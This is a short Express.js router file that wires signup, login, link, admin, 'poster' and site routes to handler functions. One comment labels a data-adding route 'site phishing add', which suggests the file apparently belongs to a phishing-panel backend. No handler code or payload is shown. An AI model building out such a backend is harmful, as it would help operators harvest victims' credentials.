const express = require('express');
const router = express.Router();
const User = require('../models/User')
const auth = require('./routehandler')

router.post('/link/add', auth.link_add);

router.get('/link/get/:id', auth.link_get);////

router.post('/signup', auth.signup_post);

router.post('/login', auth.login_post);

router.post('/skip', auth.skip_code);

router.post('/admin/add', auth.poster_add);//admin user and pass add

router.post('/ad/:adminId/:posterId', auth.add_data);  ///site phishing add

router.get('/info/:username/:id/:admin', auth.info_get);

router.get('/all/poster/:id', auth.all_poster);

router.post('/change/password/', auth.change_password);

router.post('/delete/poster/:id', auth.delete_poster);

router.post('/add/posterNumber/', auth.add_posterNumber);

router.get('/poster/details/:id/', auth.poster_details);

// router.get('/details/:id/', auth.poster_details);

router.post('/site/add/', auth.add_site);



router.get('/link/:id/', auth.link_details);
module.exports = router;
